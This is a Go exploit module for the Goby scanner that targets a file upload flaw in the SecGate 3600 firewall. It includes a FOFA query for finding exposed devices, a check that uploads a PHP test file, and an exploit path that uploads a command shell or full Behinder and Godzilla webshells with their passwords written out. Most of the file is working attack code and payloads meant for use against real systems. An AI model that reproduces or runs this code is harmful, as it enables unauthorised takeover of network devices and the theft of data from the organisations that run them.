package exploits

import (
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Netgod SecGate 3600 Firewall obj_area_import_save File Upload Vulnerability",
    "Description": "<p>Netgod SecGate 3600 firewall is a composite hardware firewall based on status detection packet filtering and application level agents. It is a new generation of professional firewall equipment specially developed for large and medium-sized enterprises, governments, military, universities and other users. It supports external attack prevention, internal network security, network access control, network traffic monitoring and bandwidth management, dynamic routing, web content filtering, email content filtering, IP conflict detection and other functions, It can effectively ensure the security of the network; The product provides flexible network routing/bridging capabilities, supports policy routing and multi outlet link aggregation; It provides a variety of intelligent analysis and management methods, supports email alarm, supports log audit, provides comprehensive network management monitoring, and assists network administrators in completing network security management.</p><p>There is a file upload vulnerability in SecGate 3600 firewall, which allows attackers to gain server control permissions.</p>",
    "Product": "legendsec-Secgate-3600-firewall",
    "Homepage": "https://www.legendsec.com/newsec.php?up=2&cid=63",
    "DisclosureDate": "2023-02-21",
    "Author": "1243099890@qq.com",
    "FofaQuery": "title=\"网神SecGate 3600防火墙\"",
    "GobyQuery": "title=\"网神SecGate 3600防火墙\"",
    "Level": "3",
    "Impact": "<p>There is a file upload vulnerability in SecGate 3600 firewall, which allows attackers to gain server control permissions.</p>",
    "Recommendation": "<p>1. The vulnerability has not been repaired officially. Please contact the manufacturer to repair the vulnerability: <a href=\"https://www.legendsec.com/\">https://www.legendsec.com/</a></p><p>2. Set access policies and white list access through security devices such as firewalls.</p><p>3. If it is not necessary, public network access to the system is prohibited.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "webshell,custom"
        },
        {
            "name": "webshell",
            "type": "select",
            "value": "behinder,godzilla",
            "show": "attackType=webshell"
        },
        {
            "name": "filename",
            "type": "input",
            "value": "fsdfsdfsdf.php",
            "show": "attackType=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "<?php print(md5(233));",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": [
                "filename|lastheader|regex|Set-Cookie: __s_sessionid__=(.*?);"
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/",
                "follow_redirect": false,
                "header": {
                    "Accept": "*/*",
                    "Accept-Encoding": "gzip, deflate",
                    "Content-Length": "577",
                    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc",
                    "User-Agent": "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)"
                },
                "data_type": "text",
                "data": "------WebKitFormBoundaryJpMyThWnAxbcBBQc\nContent-Disposition: form-data; name=\"reqfile\";filename=\"{{{filename}}}.php\"\nContent-Type: text/plain\n\n<?php echo(md5(233));unlink(__FILE__);?>\n------WebKitFormBoundaryJpMyThWnAxbcBBQc\nContent-Disposition: form-data; name=\"submit_post\"\n\nobj_area_import_save\n------WebKitFormBoundaryJpMyThWnAxbcBBQc--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/attachements/{{{filename}}}.php",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "e165421110ba03099a1c0393373c5b43",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": [
                "filename|lastheader|regex|Set-Cookie: __s_sessionid__=(.*?);"
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/",
                "follow_redirect": false,
                "header": {
                    "Accept": "*/*",
                    "Accept-Encoding": "gzip, deflate",
                    "Content-Length": "577",
                    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc",
                    "User-Agent": "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)"
                },
                "data_type": "text",
                "data": "------WebKitFormBoundaryJpMyThWnAxbcBBQc\nContent-Disposition: form-data; name=\"reqfile\";filename=\"{{{filename}}}.php\"\nContent-Type: text/plain\n\n<?php system($_POST['cmd']);unlink(__FILE__);?>\n------WebKitFormBoundaryJpMyThWnAxbcBBQc\nContent-Disposition: form-data; name=\"submit_post\"\n\nobj_area_import_save\n------WebKitFormBoundaryJpMyThWnAxbcBBQc--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/attachements/{{{filename}}}.php",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "cmd={{{cmd}}}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|(?s)(.*)"
            ]
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "10.0",
    "Translation": {
        "CN": {
            "Name": "网神 SecGate 3600 防火墙 obj_area_import_save 文件上传漏洞",
            "Product": "网神SecGate-3600防火墙",
            "Description": "<p>网神SecGate 3600防火墙是基于状态检测包过滤和应用级代理的复合型硬件防火墙，是专门面向大中型企业、政府、军队、高校等用户开发的新一代专业防火墙设备，支持外部攻击防范、内网安全、网络访问权限控制、网络流量监控和带宽管理、动态路由、网页内容过滤、邮件内容过滤、IP冲突检测等功能，能够有效地保证网络的安全；产品提供灵活的网络路由/桥接能力，支持策略路由，多出口链路聚合；提供多种智能分析和管理手段，支持邮件告警，支持日志审计，提供全面的网络管理监控，协助网络管理员完成网络的安全管理。</p><p>网神SecGate 3600防火墙存在文件上传漏洞，攻击者可以通过该漏洞获取服务器控制权限。</p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.legendsec.com/\">https://www.legendsec.com/</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>网神SecGate 3600防火墙存在文件上传漏洞，攻击者可以通过该漏洞获取服务器控制权限。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "Netgod SecGate 3600 Firewall obj_area_import_save File Upload Vulnerability",
            "Product": "legendsec-Secgate-3600-firewall",
            "Description": "<p>Netgod SecGate 3600 firewall is a composite hardware firewall based on status detection packet filtering and application level agents. It is a new generation of professional firewall equipment specially developed for large and medium-sized enterprises, governments, military, universities and other users. It supports external attack prevention, internal network security, network access control, network traffic monitoring and bandwidth management, dynamic routing, web content filtering, email content filtering, IP conflict detection and other functions, It can effectively ensure the security of the network; The product provides flexible network routing/bridging capabilities, supports policy routing and multi outlet link aggregation; It provides a variety of intelligent analysis and management methods, supports email alarm, supports log audit, provides comprehensive network management monitoring, and assists network administrators in completing network security management.</p><p>There is a file upload vulnerability in SecGate 3600 firewall, which allows attackers to gain server control permissions.</p>",
            "Recommendation": "<p>1. The vulnerability has not been repaired officially. Please contact the manufacturer to repair the vulnerability: <a href=\"https://www.legendsec.com/\">https://www.legendsec.com/</a></p><p>2. Set access policies and white list access through security devices such as firewalls.</p><p>3. If it is not necessary, public network access to the system is prohibited.</p>",
            "Impact": "<p>There is a file upload vulnerability in SecGate 3600 firewall, which allows attackers to gain server control permissions.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10806"
}`
	sendPayloadFlag5Ocz := func(hostInfo *httpclient.FixUrl, filename, content string) (*httpclient.HttpResponse, error) {
		if !strings.HasSuffix(filename, ".php") {
			filename += ".php"
		}
		getConfigRequest := httpclient.NewGetRequestConfig("/")
		getConfigRequest.VerifyTls = false
		getConfigRequest.FollowRedirect = false
		rsp, err := httpclient.DoHttpRequest(hostInfo, getConfigRequest)
		if err != nil {
			return nil, err
		}
		session := ""
		for _, cookie := range rsp.Cookies() {
			if cookie.Name != "__s_sessionid__" {
				continue
			}
			session = cookie.Value
			break
		}
		if session == "" {
			return nil, errors.New("session 获取失败，漏洞检测失败")
		}
		postRequestConfig := httpclient.NewPostRequestConfig("/")
		postRequestConfig.VerifyTls = false
		postRequestConfig.FollowRedirect = false
		postRequestConfig.Header.Store("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc")
		postRequestConfig.Data = `------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="reqfile";filename="` + filename + `"
Content-Type: text/plain

` + content + `
------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="submit_post"

obj_area_import_save
------WebKitFormBoundaryJpMyThWnAxbcBBQc--`
		// 上传文件
		_, err = httpclient.DoHttpRequest(hostInfo, postRequestConfig)
		if err != nil {
			return nil, err
		}
		getConfigRequest.URI = "/attachements/" + filename
		return httpclient.DoHttpRequest(hostInfo, getConfigRequest)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			filename := goutils.RandomHexString(16)
			rsp, err := sendPayloadFlag5Ocz(hostInfo, filename, `<?php echo(md5(233));unlink(__FILE__);?>`)
			if err != nil {
				return false
			}
			return strings.Contains(rsp.Utf8Html, "e165421110ba03099a1c0393373c5b43")
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			content := goutils.B2S(ss.Params["content"])
			filename := goutils.B2S(ss.Params["filename"])
			attackType := goutils.B2S(ss.Params["attackType"])
			webshell := goutils.B2S(ss.Params["webshell"])
			if attackType == "webshell" {
				filename = goutils.RandomHexString(16)
				if webshell == "behinder" {
					// /*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
					content = `<?php
@error_reporting(0);
session_start();
    $key="e45e329feb5d925b"; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond
	$_SESSION['k']=$key;
	session_write_close();
	$post=file_get_contents("php://input");
	if(!extension_loaded('openssl'))
	{
		$t="base64_"."decode";
		$post=$t($post."");
		
		for($i=0;$i<strlen($post);$i++) {
    			 $post[$i] = $post[$i]^$key[$i+1&15]; 
    			}
	}
	else
	{
		$post=openssl_decrypt($post, "AES128", $key);
	}
    $arr=explode('|',$post);
    $func=$arr[0];
    $params=$arr[1];
	class C{public function __invoke($p) {eval($p."");}}
    @call_user_func(new C(),$params);
?>
`
					content = `<?php
@error_reporting(0);
function Decrypt($data)
{
    $key="e45e329feb5d925b"; 
    $bs="base64_"."decode";
	$after=$bs($data."");
	for($i=0;$i<strlen($after);$i++) {
    	$after[$i] = $after[$i]^$key[$i+1&15]; 
    }
    return $after;
}
$post=Decrypt(file_get_contents("php://input"));
eval($post);
?>
`
				} else if webshell == "godzilla" {
					// 哥斯拉 pass key
					content = `<?php
@session_start();
@set_time_limit(0);
@error_reporting(0);
function encode($D,$K){
    for($i=0;$i<strlen($D);$i++) {
        $c = $K[$i+1&15];
        $D[$i] = $D[$i]^$c;
    }
    return $D;
}
$pass='pass';
$payloadName='payload';
$key='3c6e0b8a9c15224a';
if (isset($_POST[$pass])){
    $data=encode(base64_decode($_POST[$pass]),$key);
    if (isset($_SESSION[$payloadName])){
        $payload=encode($_SESSION[$payloadName],$key);
        if (strpos($payload,"getBasicsInfo")===false){
            $payload=encode($payload,$key);
        }
		eval($payload);
        echo substr(md5($pass.$key),0,16);
        echo base64_encode(encode(@run($data),$key));
        echo substr(md5($pass.$key),16);
    }else{
        if (strpos($data,"getBasicsInfo")!==false){
            $_SESSION[$payloadName]=encode($data,$key);
        }
    }
}
`
				}
			}
			rsp, err := sendPayloadFlag5Ocz(expResult.HostInfo, filename, content)
			if err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
				return expResult
			}
			// 资源存在
			if rsp.StatusCode != 200 && rsp.StatusCode != 500 {
				expResult.Success = false
				expResult.Output = "漏洞利用失败"
				return expResult
			}
			expResult.Success = true
			expResult.Output += "WebShell URL: " + expResult.HostInfo.FixedHostInfo + rsp.Request.URL.Path + "\n"
			if attackType != "custom" && webshell == "behinder" {
				expResult.Output += "Password: rebeyond\n"
				expResult.Output += "WebShell tool: Behinder v3.0\n"
			} else if attackType != "custom" && webshell == "godzilla" {
				expResult.Output += "Password: pass 加密器：PHP_XOR_BASE64\n"
				expResult.Output += "WebShell tool: Godzilla v4.1\n"
			}
			expResult.Output += "Webshell type: php"
			return expResult
		},
	))
}
